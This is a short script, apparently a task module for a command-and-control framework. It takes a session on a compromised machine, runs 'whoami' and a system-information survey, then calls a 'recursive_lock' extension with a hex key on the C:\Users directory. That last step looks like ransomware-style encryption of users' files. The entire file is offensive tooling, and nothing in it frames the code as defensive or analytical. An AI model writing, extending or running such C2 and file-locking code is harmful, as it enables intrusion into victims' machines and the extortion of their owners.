
fn run(session_id) {
    print("Orchestrating Survey for Session: " + session_id);
    send_c2_command(session_id, "whoami");
    let res1 = send_c2_extension(session_id, "sysinfo", []);
    let res2 = send_c2_extension(session_id, "recursive_lock", ["C:\\Users", "9ae73c6f2b2c5b65dcd3d246d38a01eeb7d05dc6c3674f15753c172c56310a8b"]);

    return "Deployed: " + res1 + " and " + res2;
}
